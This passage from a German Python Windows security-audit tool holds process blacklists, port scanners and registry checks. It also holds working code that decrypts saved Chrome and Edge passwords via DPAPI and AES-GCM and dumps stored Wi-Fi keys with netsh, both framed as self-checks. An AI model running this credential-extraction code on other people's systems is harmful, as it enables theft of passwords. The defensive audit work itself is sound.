        print("(13) Penetrationstest-Erkennung")
        print("(14) Registry-Backdoors (RunOnceEx, IFEO, SilentProcessExit)")
        print("(15) AV- und EDR-Bypass-Erkennung (Defender/Prozesspfade)")
        print("(16) Eventlog-Analyse (Logon, User, Dienste, Brute-Force)")
        print("(17) Erweiterter Port-Check & Docker-API-Sicherheitsanalyse")
        print("(18) Telegram-C2-Erkennung")
        print("(19) Systemhärtungs- & Schwachstellen-Check")
        print("(20) Zombie-Prozess-Scanner")
        print("(21) Browser-Extrem-Detektor (Chrome, Edge, Firefox, Opera, Brave, Vivaldi)")
        print("(22) Versteckte Admins finden")
        print("(23) WLAN-Profiler (zeigt gespeicherte SSIDs & Passwörter)")
        print("(24) Browser-Lazyness-Check (findet gespeicherte Passwörter!)")
        print("(q) Zurück")
        auswahl = input("Wähle: ")

        if auswahl == "1":
            prozess_blacklist_check()
        elif auswahl == "2":
            get_autostart_programme()
        elif auswahl == "3":
            check_verbindungen()
        elif auswahl == "4":
            check_systemzeit()
        elif auswahl == "5":
            check_dns_server()
        elif auswahl == "6":
            check_temp_ordner()
        elif auswahl == "7":
            check_hosts_datei()
        elif auswahl == "8":
            check_geplante_aufgaben()
        elif auswahl == "9":
            check_verbindungen_mit_geoip()
        elif auswahl == "10":
            check_dll_injection_ziele()
        elif auswahl == "11":
            check_fake_prozesspfade()
        elif auswahl == "12":
            check_treiber_signaturen()
        elif auswahl == "13":
            detect_pentest_activity_strong()
        elif auswahl == "14":
            detect_registry_backdoors()
        elif auswahl == "15":
            detect_av_edr_bypass()
        elif auswahl == "16":
            detect_eventlog_security()
        elif auswahl == "17":
            erweiterter_port_scanner()
        elif auswahl == "18":
            detect_telegram_c2()
        elif auswahl == "19":
            system_hardening_audit()
        elif auswahl == "20":
            zombie_process_finder_advanced()
        elif auswahl == "21":
            scan_browser_extensions()
        elif auswahl == "22":
            find_hidden_admins()
        elif auswahl == "23":
            show_all_wifi_profiles_details()
        elif auswahl == "24":
            browser_lazyness_check()
        elif auswahl == "q":
            break
        else:
            print("Ungültig.")

def browser_lazyness_check():
    while True:
        print("\n--- Browser-Lazyness-Check ---")
        print("(1) Chrome")
        print("(2) Edge")
        print("(3) Firefox")
        print("(q) Zurück")
        wahl = input("Welchen Browser willst du checken? ").lower()
        if wahl == "1":
            chrome_password_reveal()
        elif wahl == "2":
            edge_password_reveal()
        elif wahl == "3":
            firefox_password_reveal()
        elif wahl == "q":
            break
        else:
            print("Ungültige Eingabe.")

def chrome_password_reveal():
    _password_reveal_chromium("Chrome", r'AppData\Local\Google\Chrome\User Data\Default\Login Data')

def edge_password_reveal():
    _password_reveal_chromium("Edge", r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data')

def _password_reveal_chromium(browser_name, rel_path):
    userprofile = os.environ.get('USERPROFILE')
    db_path = os.path.join(userprofile, rel_path)
    if not os.path.exists(db_path):
        print(f"{browser_name}: Keine gespeicherten Passwörter gefunden (oder Browser nie benutzt).")
        return

    print(f"\n--- {browser_name} gespeicherte Passwörter ---")
    try:
        tmp_path = db_path + ".svencopy"
        shutil.copyfile(db_path, tmp_path)
        conn = sqlite3.connect(tmp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        any_found = False

        for row in cursor.fetchall():
            url = row[0]
            user = row[1]
            enc_pw = row[2]
            decrypted = None

            try:
                # Chrome/Edge (AES-GCM mit DPAPI)
                local_state_path = os.path.join(os.path.dirname(db_path), 'Local State')
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)

                # Schlüssel entschlüsseln
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

                # IV und Payload extrahieren
                iv = enc_pw[3:15]
                payload = enc_pw[15:]

                # Entschlüsseln
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16].decode()

            except Exception:
                # Fallback: direkt mit DPAPI versuchen
                try:
                    decrypted = win32crypt.CryptUnprotectData(enc_pw, None, None, None, 0)[1].decode()
                except Exception:
                    decrypted = None

            # Wenn alles fehlschlägt → verschlüsselt anzeigen
            if decrypted is None:
                verschluesselt_b64 = base64.b64encode(enc_pw).decode('utf-8') if enc_pw else "[leer]"
                decrypted = f"[Verschlüsselt: {verschluesselt_b64[:50]}...]"

            if user or decrypted:
                print(f"URL: {url}\n  Username: {user}\n  Passwort: {decrypted}")
                print("  ➜ Na siehst du, wie unsicher Browser-Speichern ist? Ein Klick, alles offen!\n")
                any_found = True

        conn.close()
        os.remove(tmp_path)

        if not any_found:
            print("Keine gespeicherten Passwörter gefunden. Entweder du bist sicher oder du hast nie was gespeichert!")

    except Exception as e:
        print(f"{browser_name}: Fehler beim Auslesen: {e}")

def firefox_password_reveal():
    userprofile = os.environ.get('USERPROFILE')
    profile_root = os.path.join(userprofile, r'AppData\Roaming\Mozilla\Firefox\Profiles')
    found = False
    for prof in glob.glob(os.path.join(profile_root, '*')):
        login_json = os.path.join(prof, 'logins.json')
        if not os.path.exists(login_json):
            continue
        print(f"\n--- Firefox Passwörter in Profil: {os.path.basename(prof)} ---")
        with open(login_json, encoding='utf-8') as f:
            data = json.load(f)
            for login in data.get("logins", []):
                user = login.get('username')
                pw = login.get('encryptedPassword')
                url = login.get('hostname')
                print(f"URL: {url}\n  Username: {user}\n  Passwort (verschlüsselt!): {pw}")
                print("  ➜ Hast du kein Master-Passwort gesetzt, kann jeder dein Firefox-DB offline knacken!\n")
                found = True
    if not found:
        print("Keine gespeicherten Passwörter gefunden (oder alles mit Master-Passwort geschützt).")

def show_all_wifi_profiles_details():
    print("\n--- WLAN-Profil-Analyse von Svenbot ---\n")
    try:
        profiles_output = subprocess.check_output('netsh wlan show profiles', shell=True).decode(errors="ignore")
    except Exception as e:
        print(f"[FEHLER] Kann Profile nicht abfragen: {e}")
        return

    # Sprache erkennen: Englisch oder Deutsch
    ssids = re.findall(r"(?:All User Profile|Alle Benutzerprofile)\s*:\s*(.*)", profiles_output)
    if not ssids:
        print("Keine WLAN-Profile gefunden!")
        return

    for ssid in ssids:
        ssid = ssid.strip()
        try:
            details = subprocess.check_output(
                f'netsh wlan show profile name="{ssid}" key=clear',
                shell=True
            ).decode(errors="ignore")

            password = re.search(r"Key Content\s*:\s*(.*)", details)
            password = password.group(1).strip() if password else "[Kein Passwort gespeichert]"

            auth = re.search(r"Authentication\s*:\s*(.*)", details)
            cipher = re.search(r"Cipher\s*:\s*(.*)", details)
            conn_type = re.search(r"Connection mode\s*:\s*(.*)", details)
            ssid_visibility = re.search(r"Network type\s*:\s*(.*)", details)
            auto_conn = re.search(r"Auto\s*:\s*(.*)", details)

            print(f"SSID: {ssid}")
            print(f"  Passwort: {password}")
            if auth: print(f"  Authentifizierung: {auth.group(1)}")
            if cipher: print(f"  Verschlüsselung: {cipher.group(1)}")
            if conn_type: print(f"  Verbindungstyp: {conn_type.group(1)}")
            if ssid_visibility: print(f"  Netzwerktyp: {ssid_visibility.group(1)}")
            if auto_conn: print(f"  Automatisch verbinden: {auto_conn.group(1)}")

            if password != "[Kein Passwort gespeichert]":
                if "WEP" in (auth.group(1) if auth else ""):
                    print("  *** WARNUNG: WEP-Netzwerk, extrem unsicher! ***")
                if "Open" in (auth.group(1) if auth else ""):
                    print("  *** WARNUNG: Offenes WLAN, kein Passwort! ***")
            print("")
        except Exception as e:
            print(f"SSID: {ssid}\n  Fehler: {e}\n")

def find_hidden_admins():
    print("\n----- Svenbot Admin-Jäger -----")
    try:
        # Alle lokalen User auflisten
        result = subprocess.run(['net', 'user'],
                                capture_output=True,
                                text=True,
                                encoding="utf-8",
                                errors="ignore")
        output = result.stdout
        if not output:
            print("Fehler beim Ausführen von 'net user'.")
            return

        users = []
        for line in output.splitlines():
            line = line.strip()
            if not line or line.startswith("Benutzerkonten") or line.startswith("Der Befehl wurde"):
                continue
            if "-----" in line:  # Überschriften ignorieren
                continue
            # Benutzername erkennen (kann mehrere pro Zeile geben)
            if line:
                users += line.split()
        if not users:
            print("Keine lokalen User gefunden.")
            return

        # Admin-Gruppe abfragen
        admin_result = subprocess.run(['net', 'localgroup', 'Administratoren'],
                                      capture_output=True,
                                      text=True,
                                      encoding="utf-8",
                                      errors="ignore")
        admin_output = admin_result.stdout
        if not admin_output:
            print("Fehler beim Ausführen von 'net localgroup Administratoren'.")
            return

        admin_lines = admin_output.splitlines()
        admins = []
        for line in admin_lines:
            line = line.strip()
            if not line or line.startswith("Aliasname") or line.startswith("Mitglieder") or line.startswith("Der Befehl wurde"):
                continue
            if line.startswith("Befehl erfolgreich abgeschlossen"):
                break
            admins.append(line)

        print("\nLokale User mit Administratorrechten:")
        zombie_count = 0
        for user in users:
            if user in admins:
                # Status des Users prüfen
                user_result = subprocess.run(['net', 'user', user],
                                             capture_output=True,
                                             text=True,
                                             encoding="utf-8",
                                             errors="ignore")
                details = user_result.stdout or ""
                if "Konto aktiv               Nein" in details or "Account active               No" in details:
                    print(f"  - {user} [DEAKTIVIERT/VERSTECKT]")
                    zombie_count += 1
                elif "Letzte Anmeldung" in details:
                    # Nie eingeloggt / seit Jahren nicht benutzt
                    if "Nie" in details or "Never" in details:
                        print(f"  - {user} [Zombie-Account: nie angemeldet!]")
                        zombie_count += 1
                    else:
                        print(f"  - {user}")
                else:
                    print(f"  - {user}")

        if zombie_count == 0:
            print("\nKeine verdächtigen oder toten Admin-Accounts gefunden. Lucky you!")
        else:
            print(f"\nAchtung: {zombie_count} verdächtige Admin-Accounts gefunden! Unnötige Admins machen den PC unsicher.")
        print("----- Check abgeschlossen. -----\n")
    except Exception as e:
        print(f"Fehler beim Admin-Scan: {e}")

def port_checker():
    print("\n[Port-Check: Ich schnüffel mal rum...]\n")
 
    hostname = socket.gethostname()
    print(f"Sven sagt: Ich prüfe bekannte Ports auf dem System: {hostname}\n")

    bekannte_ports = {
    # Dateiübertragung
    20: "FTP-Daten – braucht heute kein Mensch mehr. Offen = Angriffspunkt.",
    21: "FTP-Steuerung – unverschlüsselt & alt. Sollte zu sein.",
    69: "TFTP – Trivial FTP. Einfach = gefährlich.",
    989: "FTPS-Daten – verschlüsselter FTP. Nur offen, wenn du's nutzt.",
    990: "FTPS-Steuerung – dito.",
    873: "rsync – Datei-Sync-Server. Privat absolut unnötig.",

    # Mail
    25: "SMTP – Mailausgang. Wenn du keinen Mailserver betreibst: schließen.",
    110: "POP3 – alter Mailabruf. Wer nutzt das noch? Genau.",
    143: "IMAP – alter Maildienst. Wer hostet hier Mails?",
    465: "SMTPS – sicherer SMTP. Nur für echte Mailserver.",
    587: "SMTP Submission – Mailclients nutzen das. Nur wenn du musst.",
    993: "IMAPS – sichere Variante von IMAP. Sollte zu sein.",
    995: "POP3S – sichere Variante von POP3. Siehe oben.",

    # Remote / Fernwartung
    22: "SSH – nur für Experten. Offen = Fernzugriff für Hacker.",
    23: "Telnet – steinalt und **nie verschlüsselt**.",
    3389: "RDP – **Remote Desktop**. Wenn offen = Gefahr pur.",
    5900: "VNC – Fernsteuerung. Nur offen, wenn absichtlich!",
    5631: "PCAnywhere – Alt, unsicher, vergiss es.",
    5985: "WinRM – Windows Remote Management. Nur in Firmennetzen sinnvoll.",
    5986: "WinRM über HTTPS – dito.",

    # Windows-Dienste
    135: "RPC – interner Windows-Kommunikationsport. Extern = gefährlich.",
    137: "NetBIOS – Legacy. Heimnetz braucht das nicht.",
    138: "NetBIOS-Datagramme – 90er Style.",
    139: "NetBIOS-Session – für alte Netzwerke. Schließen!",
    445: "SMB – Dateifreigabe. Intern ok, extern = WannaCry-Einladung.",

    # Netzwerkdienste
    53: "DNS – Nur sinnvoll auf Servern. Sonst: Angriffspunkt.",
    67: "DHCP-Server – nur bei Routern oder Servern sinnvoll.",
    68: "DHCP-Client – normalerweise ungefährlich.",
    161: "SNMP – Monitoring-Dienst. Offen = Informationsleck.",
    162: "SNMP-Traps – sollte nur auf Monitoringsystemen aktiv sein.",

    # Web
    80: "HTTP – Kein Webserver? Dann bitte zu.",
    443: "HTTPS – lokal offen? Warum? Kein Webserver = kein Bedarf.",
    8080: "Alternativer HTTP-Port – gerne vergessen & offen.",
    8443: "HTTPS-Alternative – Entwicklerkram? Sonst: zumachen.",
    10000: "Webmin – Admininterface. Patchen oder deaktivieren.",

    # Datenbanken
    1433: "MSSQL – Wenn offen: Datenbankraub leicht gemacht.",
    1521: "Oracle DB – Groß, mächtig, aber offen = kritisch.",
    3306: "MySQL – Nur wenn du bewusst hostest.",
    5432: "PostgreSQL – siehe MySQL.",
    6379: "Redis – offen = Daten im Klartext, sehr riskant.",
    27017: "MongoDB – beliebt bei Angreifern, wenn offen.",

    # Logging & Monitoring
    514: "Syslog – Nur für Admins. Offene Ports = Log-Leaks.",
    9200: "Elasticsearch – Riesige Datenmengen offen? Schlechte Idee.",

    # Auth / Directory
    389: "LDAP – Firmenverzeichnisse. Privat nicht nötig.",
    636: "LDAPS – sicherer LDAP. Auch nur intern sinnvoll.",

    # Exploit-Klassiker / Altlasten
    512: "Rexec – Remote Execution. Uralt und unsicher.",
    513: "Rlogin – Unsicherer Fernzugriff. Finger weg.",
    2049: "NFS – Dateiübertragung. Nicht für Heimnetz offen lassen.",

    # Proxy / VPN / Tor
    1080: "SOCKS Proxy – offen = Fremde nutzen dich als Sprungbrett.",
    9050: "Tor SOCKS – nur offen, wenn du Tor-Relay bist.",
    1194: "OpenVPN – Nur offen, wenn du’s nutzt.",
    500: "IKE – IPsec VPNs nutzen das. Sonst unnötig.",

    # Administration & APIs
    2375: "Docker API – ungesichert offen = Vollzugriff.",
    2379: "etcd – Cluster-Verwaltung. Nur intern!",
    2380: "etcd Peer – dito.",

    # Diverses
    6667: "IRC – Nur offen, wenn du im Jahr 2000 bist.",
    11211: "Memcached – extrem anfällig für Missbrauch.",
    81: "HTTP-Alternative – häufig bei Routern oder IP-Kameras.",
    88: "Kerberos – Authentifizierung, nur intern auf Domain-Controllern.",
    1352: "Lotus Domino – IBM-Altlast. Sollte zu sein.",
    1900: "SSDP – UPnP-Service. Gefährlich, wenn offen nach außen.",
    2000: "Cisco SCCP – VoIP-Systeme. Nicht im Heimnetz nötig.",
    2483: "Oracle DB Listener (TCP) – ähnlich wie 1521, wird oft vergessen.",
    2484: "Oracle DB Listener (SSL) – dito, mit Verschlüsselung.",
    3268: "Global Catalog – nur Domain-Controller.",
    3300: "SAP Dispatcher – Firmenintern, sonst: Sicherheitsrisiko.",
    3388: "RDP-Alternative – wenn jemand Port 3389 versteckt hat.",
    4000: "ICQ, alte Backdoors – Nostalgie trifft Risiko.",
    5000: "UPnP / WebDAV – **wird oft durch Router offen gelassen**.",
    5800: "VNC Webinterface – meist vergessen zu schützen.",
    6660: "IRC – weitere Varianten. Nur offen bei Absicht.",
    7000: "AOL / Backdoor-Port – Historisch belastet.",
    7547: "TR-069 – Fernwartung von Routern. Meist katastrophal abgesichert.",
    8000: "Webinterface (Test, Kamera, Drucker...) – oft schlecht gesichert.",
    8081: "Weitere HTTP-Alternative – oft bei IoT & Dev-Tools offen.",
    9001: "Tor Relay – sollte nur offen sein, wenn du ein Relay betreibst.",
    49152: "Windows Dynamic RPC – in Netzwerken normal, aber sollte nie offen ins Internet stehen.",
}

    offene_standard_ports = []
    for port, beschreibung in bekannte_ports.items():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                result = sock.connect_ex(("127.0.0.1", port))
                if result == 0:
                    print(f"Sven sagt: ⚠️ Port {port} ist **offen**. {beschreibung}")
                    offene_standard_ports.append(port)
                else:
                    print(f"Sven sagt: ✅ Port {port} ist **geschlossen**. Gut so.")
        except Exception as e:
            print(f"Sven sagt: ❓ Fehler beim Prüfen von Port {port}: {e}")

    print("\n[Erweiterte Analyse: Wer lauscht WIRKLICH? (Alle offenen lokalen Ports)]\n")

    # 1. Liste aller bekannten "riskanten" Ports für Shells/Backdoors
    verdächtige_ports = {4444, 1337, 9001, 6666, 8080, 3389, 5000, 5800, 2222, 5555, 6969, 31337, 12345, 1234, 4321, 6667, 1080, 9050}
    suspicious_listener_found = False

    # 2. Alle aktuellen offenen Listener anzeigen
    seen = set()
    for conn in psutil.net_connections(kind='inet'):
        if conn.status != 'LISTEN' or not conn.laddr:
            continue
        ip = conn.laddr.ip
        port = conn.laddr.port
        pid = conn.pid

        if (ip, port, pid) in seen:
            continue
        seen.add((ip, port, pid))

        try:
            proc = psutil.Process(pid)
            name = proc.name()
            cmd = " ".join(proc.cmdline()) or "?"
            path = proc.exe()
        except Exception:
            name = "Unbekannt"
            cmd = "?"
            path = "?"

        öffentlich = ip in ("0.0.0.0", "::")
        port_riskant = port in verdächtige_ports

        print(f"🧠 Lauscher: {name} (PID {pid})")
        print(f"   → Lauscht auf: {ip}:{port}")
        print(f"   → Pfad: {path}")
        print(f"   → Befehl: {cmd}")

        # Detailbewertung
        if öffentlich:
            print("   ⚠️ Lauscht auf **alle** Schnittstellen (0.0.0.0) – von außen erreichbar!")
        elif ip.startswith("127."):
            print("   ℹ️ Lauscht NUR lokal (127.x.x.x) – nicht direkt aus dem Netz erreichbar.")

        if port_riskant:
            print("   ⚠️ Verdächtiger Port (Backdoor/Shell/Exploits häufig!)")
        if port in offene_standard_ports:
            print("   ℹ️ Das ist ein Port aus der Standardliste – siehe oben für Bewertung.")

        # Verdacht-Flag setzen
        if öffentlich or port_riskant:
            suspicious_listener_found = True

        print()  # Leerzeile zur Lesbarkeit

    # Hinweis, wenn keine Lauscher gefunden wurden
    if not seen:
        print("Sven sagt: Keine offenen Listener gefunden. Dein System hält die Ohren geschlossen – oder ist SEHR gut getarnt.")

    print("\n[Extra: Ungewöhnliche, nicht standardisierte Listener prüfen]\n")
    for conn in psutil.net_connections(kind='inet'):
        if conn.status != 'LISTEN' or not conn.laddr:
            continue
        port = conn.laddr.port
        if port not in bekannte_ports and port not in verdächtige_ports and port >= 1024:
            pid = conn.pid
            try:
                proc = psutil.Process(pid)
                name = proc.name()
                path = proc.exe()
            except Exception:
                name = "Unbekannt"
                path = "?"
            print(f"Sven sagt: 🔍 Ungewöhnlicher offener Port {port} (Prozess: {name}, Pfad: {path}) – das solltest du mal checken.")

    if suspicious_listener_found:
        print("\nSven sagt: 🚨 Mindestens ein verdächtiger oder offener Listener entdeckt. Prüfe diese Prozesse unbedingt, falls sie dir nicht bekannt vorkommen!")
    else:
        print("\nSven sagt: Lauscherprüfung abgeschlossen. Kein gefährlicher Port/Listener entdeckt.")

    print("\nPort-Check komplett. Wenn etwas komisch wirkt: recherchieren, Firewall prüfen oder Prozess abschießen.\n")

def erweiterter_port_scanner():

    print("\n[Erweiterter Port- & Security-Scanner – Monitoring von Docker, Tor/SOCKS5 & typischen Hack-Ports]\n")

    # 1. Definition: Kritische Ports und Kontext
    docker_ports = {2375: "Docker API (ungesichert!)", 2376: "Docker API (TLS)"}
    tor_port = 9050
    hack_ports = [
        4444, 1337, 9001, 6666, 8080, 3389, 5000, 5800, 2222, 5555, 6969,
        31337, 12345, 1234, 4321, 6667, 1080, 12346, 54321, 31338, 5001, 3131,
        52013, 4711, 10000, 666, 31335, 16969, 7331, 4242, 6767, 4545
    ]  # Viele RAT/Backdoor/Shell/Exploit-Ports

    # 2. Listener sammeln (nur einmal pro (ip, port, pid))
    seen = set()
    results = []

    for conn in psutil.net_connections(kind='inet'):
        if conn.status != 'LISTEN' or not conn.laddr:
            continue
        ip = conn.laddr.ip
        port = conn.laddr.port
        pid = conn.pid
        if (ip, port, pid) in seen:
            continue
        seen.add((ip, port, pid))

        # Prozessinfos
        try:
            proc = psutil.Process(pid)
            pname = proc.name()
            cmdline = " ".join(proc.cmdline()) or "?"
        except Exception:
            pname = "Unbekannt"
            cmdline = "?"

        öffentlich = ip in ("0.0.0.0", "::")
        lokal = ip.startswith("127.")

        info = {
            "ip": ip,
            "port": port,
            "pid": pid,
            "prozess": pname,
            "cmd": cmdline,
            "öffentlich": öffentlich,
            "lokal": lokal,
            "klasse": "normal",
            "kontext": ""
        }

        # Bewertung: Docker
        if port in docker_ports:
            info["klasse"] = "docker"
            if port == 2375:
                info["kontext"] = "🚨 Docker-API ohne Auth – **Vollzugriff auf Container & Host!**"
            else:
                info["kontext"] = "⚠️ Docker-API über TLS – prüfe Zertifikate & Authentifizierung!"
            if öffentlich:
                info["kontext"] += " (API ist für das gesamte Netzwerk offen!)"
        # Bewertung: Tor/SOCKS5
        elif port == tor_port:
            info["klasse"] = "tor"
            if öffentlich:
                info["kontext"] = "🚨 Tor/SOCKS5-Proxy offen für das gesamte Netzwerk! Mögliches Leck oder Proxy-Missbrauch."
            elif lokal:
                info["kontext"] = "ℹ️ Tor/SOCKS5-Proxy lauscht lokal – meist für eigenen Tor-Browser, aber prüfen ob gewollt."
            else:
                info["kontext"] = "⚠️ Tor/SOCKS5 an ungewöhnlicher IP – prüfen!"
        # Bewertung: Hack/Backdoor-Ports
        elif port in hack_ports:
            info["klasse"] = "hack"
            if öffentlich:
                info["kontext"] = "⚠️ Sehr oft von Malware, RATs oder Exploits genutzt! Wenn unbekannt: Sofort prüfen!"
            else:
                info["kontext"] = "Verdächtiger Port, oft Shells oder Malware. Prüfe den Prozess."
        # Rest: „normal“
        else:
            info["klasse"] = "normal"
            info["kontext"] = "Standardport oder nicht ungewöhnlich, aber prüfen falls Prozess unbekannt."

        results.append(info)

    # 3. Ausgabe sortiert: Docker → Tor → Hack → Rest
    if not results:
        print("Sven sagt: Keine offenen Listener gefunden – System ist dicht! Oder du hast keine Rechte…\n")
        return

    # Helper für sortierte Ausgabe
    def print_listener(res):
        art = res["klasse"]
        prefix = {
            "docker": "🐳",
            "tor": "🧅",
            "hack": "💀",
            "normal": "🔍"
        }.get(art, "🔍")
        print(f"{prefix} Port {res['port']} offen auf {res['ip']}  (Prozess: {res['prozess']}, PID {res['pid']})")
        print(f"    Befehl: {res['cmd']}")
        if res["öffentlich"]:
            print("    ⚠️ Lauscht auf **alle** Schnittstellen (von außen erreichbar!)")
        elif res["lokal"]:
            print("    Lauscht nur lokal (127.0.0.1)")
        print(f"    Kontext: {res['kontext']}\n")

    # Sortierte Ausgabe
    for art in ("docker", "tor", "hack", "normal"):
        for res in results:
            if res["klasse"] == art:
                print_listener(res)

    print("Sven sagt: Monitoring abgeschlossen! Alle gefundenen Listener siehst du oben mit Bewertung und Kontext.\n")
    print("Security-Tipp: Unbekannte Ports/Prozesse immer nachrecherchieren, unnötige Listener sofort beenden oder absichern.")

def prozess_blacklist_check():
    print("\n[Sven prüft verdächtige Prozesse...]")

    # 1. Blacklist bekannter bösartiger Prozesse
    blackliste = {
        "mimikatz.exe":    "Passwortklauer deluxe – ist das Absicht?",
        "procdump.exe":    "Procdump läuft – jemand will wohl Speicher auslesen?",
        "lsass.exe":       "LSASS-Zugriff? Da schnüffelt jemand nach Passwörtern.",
        "dumpert.exe":     "Dumpert aktiv – klingt süß, ist aber böse.",
        "sekurlsa.exe":    "LSA-Auslese. Klartextpasswörter gefällig?",
        "teamviewer.exe":  "TeamViewer – jemand schaut vielleicht gerade zu. 👀",
        "anydesk.exe":     "AnyDesk offen – hoffentlich du selbst.",
        "vnc.exe":         "VNC entdeckt – Fernsteuerung oder Fernproblem?",
        "radmin.exe":      "Radmin? Admin, really?",
        "remcos.exe":      "REMcos ist Malware. Punkt.",
        "rport.exe":       "Reverse Port Shell. Was zur Hölle geht hier ab?",
        "revenge_rat.exe": "RevengeRAT – Fernsteuerung mit Rachegedanken.",
        "spy_net.exe":     "SpyNet – klingt schon wie ein James-Bond-Villain.",
        "xrat.exe":        "X-RAT – für alle, die RATs mit Extra-X mögen.",
        "venom_rat.exe":   "VenomRAT – giftige Fernsteuerung.",
        "warzone_rat.exe": "Warzone RAT – aggressive Übernahme, live dabei.",
        "meterpreter.exe": "Meterpreter? Das ist nicht Minecraft, das ist Hacking-Zubehör.",
        "beacon.exe":      "Cobalt Strike Beacon – keine gute Gesellschaft.",
        "havoc.exe":       "Havoc gefunden. Und nein, das ist kein Spiel.",
        "empire.exe":      "Empire? Eher ein Malware-Imperium.",
        "sliver.exe":      "Sliver läuft – das ist kein Glitzer, das ist Post-Exploitation.",
        "godzilla.exe":    "Godzilla? Nein, das ist kein Film – das ist Shell-Zeug.",
        "chisel.exe":      "Chisel tunnelt durch Firewalls – wenn’s leise sein soll.",
        "earthworm.exe":   "Earthworm – sieht harmlos aus, ist aber ein Tunnel-Profi.",
        "ssh_client.exe":  "Custom SSH-Clients – beliebt bei Hackern mit Stil.",
        "powershell.exe":  "PowerShell läuft – kann harmlos sein, kann aber auch böse enden.",
        "cmd.exe":         "CMD offen. Kein Grund zur Panik – aber ich beobachte das.",
        "wscript.exe":     "WScript aktiv – wer schreibt hier Scripte ohne dein Wissen?",
        "cscript.exe":     "CScript? Script-Kiddie oder Admin?",
        "mshta.exe":       "MSHTA entdeckt – bekannt aus 'Malware Weekly'.",
        "rundll32.exe":    "Rundll32 nutzt man normal nicht freiwillig. Verdacht: Ja.",
        "regsvr32.exe":    "regsvr32 aktiv – typische Methode für fiese Tricks.",
        "schtasks.exe":    "Geplante Aufgabe? Oder geplante Überraschung?",
        "installutil.exe":"InstallUtil? Klingt wie Setup, kann aber Payloads laden.",
        "certutil.exe":    "CertUtil ist ein Datei-Downloader – unauffällig böse.",
        "bitsadmin.exe":   "BITSAdmin lädt Dateien aus dem Netz – gern missbraucht.",
        "wmic.exe":        "WMIC – Fernabfragen und Remote-Ausführung? Nicht gut.",
        "msbuild.exe":     "MSBuild kann auch EXE-Dateien 'bauen' – ohne dein Wissen.",
        "svchost.exe":     "Wenn es außerhalb von System32 läuft – Gefahr!",
    }

    # 2. Whitelist legitimer Pfade pro Prozess
    legit_paths = {
        "svchost.exe":   [r"%SystemRoot%\\System32"],
        "lsass.exe":     [r"%SystemRoot%\\System32"],
        "notepad.exe":   [r"%SystemRoot%\\System32", r"%ProgramFiles%\\WindowsApps"],
    }
    # Normalisierte Pfade
    legit_paths_norm = {}
    for name, paths in legit_paths.items():
        normed = []
        for wl in paths:
            expanded = os.path.expandvars(wl)
            normed.append(os.path.normcase(os.path.normpath(expanded)))
        legit_paths_norm[name] = normed

    # 3. Tolerierte Prozesse (z. B. interne Bot-Nutzung)
    tolerated = ["cmd.exe", "python.exe"]

    # 4. Sammle Prozessinfos und Zähler
    proc_infos = []
    counts = {}
    for proc in psutil.process_iter(['name', 'exe']):
        try:
            name = proc.info.get('name', '')
            if not name:
                continue
            name = name.lower()
            counts[name] = counts.get(name, 0) + 1
            exe_raw = proc.info.get('exe') or ""
            pfad = os.path.normcase(os.path.normpath(exe_raw))
            proc_infos.append({'name': name, 'pfad': pfad})
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    gefunden = False

    # 5. Kontextprüfung für cmd & powershell (zu viele Instanzen)
    for name in ("cmd.exe", "powershell.exe"):
        if counts.get(name, 0) > 1 and name not in tolerated:
            print(f"Sven sagt: ⚠️ Mehrere Instanzen von '{name}' ({counts[name]}) – ungewöhnlich!")
            gefunden = True

    # 6. Pfad- und Prozess-Prüfungen
    for p in proc_infos:
        name = p['name']
        pfad = p['pfad']
        if name in tolerated:
            print(f"Sven sagt: ℹ️ '{name}' wird toleriert (Bot-interne Nutzung).")
            continue
        if name in legit_paths_norm:
            allowed = legit_paths_norm[name]
            if not any(pfad.startswith(w) for w in allowed):
                print(f"Sven sagt: ⚠️ '{name}' läuft außerhalb erlaubter Pfade: {pfad}")
                gefunden = True
            elif name == "lsass.exe":
                print("Sven sagt: ℹ️ 'lsass.exe' befindet sich im korrekten Verzeichnis – normaler Sicherheitsprozess.")
        elif name in ("dllhost.exe", "conhost.exe", "taskmgr.exe"):
            if not pfad.startswith(r"c:\windows\system32"):
                print(f"Sven sagt: ⚠️ '{name}' läuft außerhalb von System32: {pfad}")
                gefunden = True

    # 7. Prüfung gegen Blacklist mit Whitelist-Skip
    # Aktuelle Pfade gruppieren
    active_paths = {}
    for p in proc_infos:
        active_paths.setdefault(p['name'], []).append(p['pfad'])

    for böse, kommentar in blackliste.items():
        pfads = active_paths.get(böse, [])
        # Skip, wenn in Whitelist und im erlaubten Pfad
        if böse in legit_paths_norm:
            if any(any(pf.startswith(w) for w in legit_paths_norm[böse]) for pf in pfads):
                continue
        if pfads:
            for pf in pfads:
                print(f"Sven sagt: ⚠️ Prozess **{böse}** läuft. {kommentar}")
                print(f"Sven sagt: Tatsächlicher Pfad: {pf}")
            print("Sven sagt: Wenn du das nicht kennst – bitte beim echten Sven melden.")
            gefunden = True

    if not gefunden:
        print("Sven sagt: Keine verdächtigen Prozesse entdeckt. Aber ich bleib misstrauisch.")

def get_autostart_programme():
    print("\n[Sven listet deine Autostart-Einträge auf…]")

    # 1. Whitelist typischer Autostart-Leichen (lowercase)
    autostart_leichen_whitelist = [
        "onedrive.exe", "steam.exe", "epicgameslauncher.exe", "msedge.exe", "pdf24.exe",
        "rtkauduservice64.exe", "amdnoisesuppression.exe"
    ]

    entries = []
    registry_paths = [
        (winreg.HKEY_CURRENT_USER,  r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    ]

    # 2. Einträge aus Registry auslesen
    for hive, path in registry_paths:
        try:
            key = winreg.OpenKey(hive, path)
        except (FileNotFoundError, PermissionError):
            continue

        i = 0
        while True:
            try:
                name, cmd, _ = winreg.EnumValue(key, i)
            except OSError:
                break
            i += 1

            # Besseres Parsen selbst bei Leerzeichen in Pfaden
            try:
                parts = shlex.split(cmd, posix=False)
                exe_path = parts[0]
            except ValueError:
